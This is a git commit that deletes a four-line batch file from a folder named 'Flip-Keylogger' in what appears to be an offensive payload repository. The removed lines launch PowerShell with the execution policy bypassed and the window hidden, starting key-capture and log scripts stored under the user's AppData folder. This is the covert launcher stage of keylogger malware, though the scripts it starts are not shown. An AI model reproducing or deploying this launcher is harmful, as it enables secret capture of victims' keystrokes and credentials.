e5132fdb52a3b27533c88ca5a39d10de9558e8d0
I-Am-Jakoby <Michaelryanchitwood@gmail.com>
2023-01-03 23:14:39 -0600

    Delete -p.cmd

--- Payloads/Flip-Keylogger/-p.cmd
+++
@@ -1,4 +0,0 @@
-@echo off
-powershell -ep bypass -w h Start-Process powershell.exe -windowstyle hidden  "$env:appdata/-locker/-keys.ps1"
-powershell -ep bypass -w h Start-Process powershell.exe -windowstyle hidden  "$env:appdata/-locker/-logs.ps1"
-powershell -ep bypass -w h Start-Process powershell.exe -windowstyle hidden  "$env:appdata/-exit.ps1"
